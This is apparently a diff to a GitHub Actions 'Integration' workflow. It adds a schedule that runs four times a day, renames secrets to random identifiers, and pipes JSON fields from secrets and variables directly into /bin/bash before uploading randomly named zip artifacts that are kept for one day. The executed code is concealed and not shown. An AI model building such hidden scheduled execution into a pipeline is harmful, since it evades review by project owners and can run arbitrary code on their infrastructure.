@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '54 1,7,13,19 * * *'
 env:
   CI: true
 concurrency:
@@ -14,16 +16,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          wy349: ${{ secrets.wy349 }}
+          ap92: ${{ secrets.ap92 }}
         run: |
-          printf '%s' "$wy349" | jq -r .khvp84060 | /bin/bash
-          echo $yd94529 | jq -r .rh8 | /bin/bash
-          printf '%s' "$ddkb436" | jq -r .ntv16 | /bin/bash
-          printf '%s' "$lr55" | jq -r .wvtc30788 | /bin/bash
+          printf '%s' "$ap92" | jq -r .vt85 | /bin/bash
+          printf '%s' "$a9814" | jq -r .k20397 | /bin/bash
+          printf '%s' "$rrxi182" | jq -r .vbmk0620 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: W79y9XXo
+          name: zMD2bWJi
           path: "*.zip"
           retention-days: 1
